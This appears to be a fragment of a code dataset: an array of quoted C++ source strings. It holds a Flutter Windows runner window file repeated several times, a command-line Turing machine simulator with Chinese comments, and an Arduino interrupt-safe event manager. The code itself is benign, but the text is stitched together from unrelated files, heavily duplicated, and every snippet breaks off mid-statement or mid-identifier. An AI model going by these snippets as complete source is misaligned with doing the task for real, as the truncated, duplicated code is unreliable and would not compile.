~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <fstream>\n#include <cstring>\n#include <sstream>\n#include <vector>\n#include <map>\n\n#include <toolFunction.h>\n\nusing namespace std;\n\nstruct Transition{\n    string oldStates;\n    string oldSymbols;\n    string newSymbols;\n    string directions;\n    string newStates;\n};\n\nbool verbose = false;\nvector<string> Q;\nvector<string> S;\nvector<string> G;\nstring q0;\nstring B;\nvector<string> F;\nint N;\nvector<Transition> delta;\n\nvoid parse(char *turingFile);\n\nvoid simulate(char *input);\n\nint main(int argc, char *argv[])\n{\n    //-h\u5728\u547d\u4ee4\u884c\u53c2\u6570\u91cc\u4f18\u5148\u7ea7\u6bd4\u8f83\u9ad8\uff0c\u53ea\u8981\u547d\u4ee4\u4e2d\u6709-h\uff0c\u81ea\u52a8\u8fdb\u5165\u624b\u518c\u9875\u9762\n    for (int i = 1; i < argc; i++)\n    {\n        if (strcmp(argv[i], \"-h\") == 0 || strcmp(argv[i], \"--help\") == 0)\n        {\n            cout << \"usage: turing [-v|--verbose] [-h|--help] <tm> <input>\" << endl;\n            exit(0);\n        }\n    }\n    char *turingFile = NULL;\n    char *input = NULL;\n    for (int i = 1; i < argc; i++)\n        if (strcmp(argv[i], \"-v\") == 0 || strcmp(argv[i], \"--verbose\") == 0)\n            verbose = true;\n    // \u7a0b\u5e8f\u4f20\u5165\u53c2\u6570\u6709\u8bef\n    if ((verbose && argc != 4) || (!verbose && argc != 3))\n    {\n        cerr << \"syntax error\" << endl\n            << \"usage: turing [-v|--verbose] [-h|--help] <tm> <input>\" << endl;\n        exit(1);\n    }\n\n    input = argv[argc - 1];\n    if ((string(argv[argc - 2])).length() < 3 || ((string(argv[argc - 2])).substr(string(argv[argc - 2]).length() - 3) != \".tm\"))\n    {\n        cerr << \"syntax error\" << endl\n            << \"usage: turing [-v|--verbose] [-h|--help] <tm> <input>\" << endl;\n        exit(1);\n    }\n    else\n        turingFile = argv[argc - 2];\n\n    parse(turingFile);\n    simulate(input);\n}\n\nvoid parse(char *turingFile){\n    ifstream file(turingFile);\n    if(file.is_open()){\n        int i = 0;\n        string line;\n        while(getline(file, line)){\n            line = formatLine(line);\n            if(line == \"\")\n                continue;\n            else if(startwith(line, \";\"))\n                continue;\n            else if(i == 0){\n                i++;\n\n                //\u68c0\u67e5\u72b6\u6001\u96c6Q\u7684\u8bed\u6cd5\n                if(!startwith(line, \"#Q = {\") || line.at(line.length() - 1) != '}'){\n                    cerr << \"syntax error\" << endl;\n                    if (verbose)\n                        cerr << \"Q: Turing machine program syntax\" << endl;\n                    exit(1);\n                }\n\n                if(checkBraceNum(line)){\n                    string Qstr = line.substr(line.find(\"{\"));\n                    Q = splitString(Qstr, \"{,}\");\n                    if(!checkStates(Q)){\n                        cerr << \"syntax error\" << endl;\n                        if (verbose)\n                            cerr << \"Q: The state set is illegal.\" << endl;\n                        exit(1);\n                    }\n                }\n                else{\n                    cerr << \"syntax error\" << endl;\n                    if (verbose)\n                        cerr << \"Q: Turing machine program syntax\" << endl;\n                    exit(1);\n                }\n            }\n            else if(i == 1){\n                i++;\n\n                //\u68c0\u67e5\u8f93\u5165\u7b26\u53f7\u96c6\u5408S\u7684\u8bed\u6cd5\n                if(!startwith(line, \"#S = {\") || line.at(line.length() - 1) != '}'){\n                    cerr << \"syntax error\" << endl;\n                    if (verbose)\n                        cerr << \"S: Turing machine program syntax\" << endl;\n                    exit(1);\n                }\n\n                if(checkBraceNum(line)){\n                    string Sstr = line.substr(line.find(\"{\"));\n                    S = splitString(Sstr, \"{,}\");\n                    if(!checkSymbols(S, \" ,;{}*_\")){\n                        cerr << \"syntax error\" << endl;\n                        if (verbose)\n                            cerr << \"S: The label character set is illegal.\" << endl;\n                        exit(1);\n                    }\n                }\n                else{\n                    cerr << \"syntax error\" << endl;\n                    if (verbose)\n                        cerr << \"S: Turing machine program syntax\" << endl;\n                    exit(1);\n                }\n            }\n            else if(i == 2){\n                i++;\n\n                //\u68c0\u67e5\u7eb8\u5e26\u7b26\u53f7\u96c6G\u7684\u8bed\u6cd5\n                if(!startwith(line, \"#G = {\") || line.at(line.length() - 1) != '}'){\n                    cerr << \"syntax error\" << endl;\n                    if (verbose)\n                        cerr << \"G: Turing machine program syntax\" << endl;\n                    exit(1);\n                }\n\n                if(checkBraceNum(line)){\n                    string Gstr = line.substr(line.find(\"{\"));\n                    G = splitString(Gstr, \"{,}\");\n                    if(!checkSymbols(G, \" ,;{}*\")){\n                        cerr << \"syntax error\" << endl;\n                        if (verbose)\n                            cerr << \"G: The label character set is illegal.\" << endl;\n                        exit(1);\n                    }\n                }\n                else{\n                    cerr << \"syntax error\" << end",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n * EventManager.cpp\n *\n\n * An event handling system for Arduino.\n *\n * Author: igormt@alumni.caltech.edu\n * Copyright (c) 2013 Igor Mikolic-Torreira\n *\n * Inspired by and adapted from the\n * Arduino Event System library by\n * Author: mromani@ottotecnica.com\n * Copyright (c) 2010 OTTOTECNICA Italy\n *\n * This library is free software; you can redistribute it\n * and/or modify it under the terms of the GNU Lesser\n * General Public License as published by the Free Software\n * Foundation; either version 2.1 of the License, or (at\n * your option) any later version.\n *\n * This library is distributed in the hope that it will\n * be useful, but WITHOUT ANY WARRANTY; without even the\n * implied warranty of MERCHANTABILITY or FITNESS FOR A\n * PARTICULAR PURPOSE.  See the GNU Lesser General Public\n * License for more details.\n *\n * You should have received a copy of the GNU Lesser\n * General Public License along with this library; if not,\n * write to the Free Software Foundation, Inc.,\n * 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA\n *\n */\n\n\n#include \"EventManager.h\"\n\nnamespace\n{\n    // This class takes care of turning interrupts on and off.\n    // There is a different implementation of this class for each architecture that\n    // has a different interrupt model.  #if macros ensure only one version is defined.\n\n#if defined( __AVR_ARCH__ )\n\n    class SuppressInterrupts\n    {\n    public:\n\n        // Record the current state and suppress interrupts when the object is instantiated.\n        SuppressInterrupts()\n        {\n            mInterruptsWereOn = (SREG & (1<<SREG_I));\n            cli();\n        }\n\n        // Restore whatever interrupt state was active before\n        ~SuppressInterrupts()\n        {\n            // Turn on global interrupts, only if they were already on\n            if ( mInterruptsWereOn )\n            {\n                sei();\n            }\n        }\n\n    private:\n\n        uint8_t     mInterruptsWereOn;\n    };\n\n#elif defined( SAM ) || defined( ARDUINO_ARCH_SAMD )\n\n    class SuppressInterrupts\n    {\n    public:\n\n        // Record the current state and suppress interrupts when the object is instantiated.\n        SuppressInterrupts()\n        {\n            mInterruptsWereOn = (__get_PRIMASK() == 0);\n            __disable_irq();\n        }\n\n        // Restore whatever interrupt state was active before\n        ~SuppressInterrupts()\n        {\n            // Turn on interrupts, only if they were already on\n            if ( mInterruptsWereOn )\n            {\n                __enable_irq();\n            }\n        }\n\n    private:\n\n        uint8_t     mInterruptsWereOn;\n    };\n\n#elif defined( ESP8266 )\n\n    class SuppressInterrupts\n    {\n    public:\n\n        // Record the current state and suppress interrupts when the object is instantiated.\n        SuppressInterrupts()\n        {\n            // This turns off interrupts and gets the old state in one function call\n            // See https://github.com/esp8266/Arduino/issues/615 for details\n            // level 15 will disable ALL interrupts,\n            // level 0 will enable ALL interrupts\n            mSavedInterruptState = xt_rsil( 15 );\n        }\n\n        // Restore whatever interrupt state was active before\n        ~SuppressInterrupts()\n        {\n            // Restore the old interrupt state\n            xt_wsr_ps( mSavedInterruptState );\n        }\n\n    private:\n\n        uint32_t    mSavedInterruptState;\n    };\n\n#elif defined( CORE_TEENSY )\n    \n    class SuppressInterrupts\n    {\n    public:\n        \n        //Reference: https://www.pjrc.com/teensy/interrupts.html\n        //Backup the interrupt enable state and restore it\n        SuppressInterrupts() \n        {\n            mSregBackup = SREG;     /* save interrupt enable/disable state */\n            cli();                  /* disable the global interrupt */\n        }\n        \n        ~SuppressInterrupts() \n        {\n            SREG = mSregBackup;     /* restore interrupt state */\n        }\n        \n    private:\n        \n        uint8_t mSregBackup;\n    };\n    \n#elif defined( ESP32 )\n    \n    #include <freertos/portmacro.h>\n\n    class SuppressInterrupts\n    {\n    public:\n        \n        // Reference: https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-guides/freertos-smp.html#critical-sections-disabling-interrupts\n        // Enter critical section\n        SuppressInterrupts()\n        {\n            portENTER_CRITICAL(&gMux);\n        }\n        \n        // Exit critical section\n        ~SuppressInterrupts()\n        {\n            portEXIT_CRITICAL(&gMux);\n        }\n\n        static portMUX_TYPE gMux;\n    };\n    \n    // gMux is globally accessible as a public static member variable\n    portMUX_TYPE SuppressInterrupts::gMux = portMUX_INITIALIZER_UNLOCKED;\n\n#else\n\n#error \"Unknown microcontroller:  Need to implement class SuppressInterrupts for this microcontroller.\"\n\n#endif\n\n}\n\n\n\n\n#if EVENTMANAGER_DEBUG\n#define EVTMGR_DEBUG_PRINT( x )\t\tSerial.print( x );\n#define EVTMGR_DEBUG_PRINTLN( x )\tSerial.printl",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, 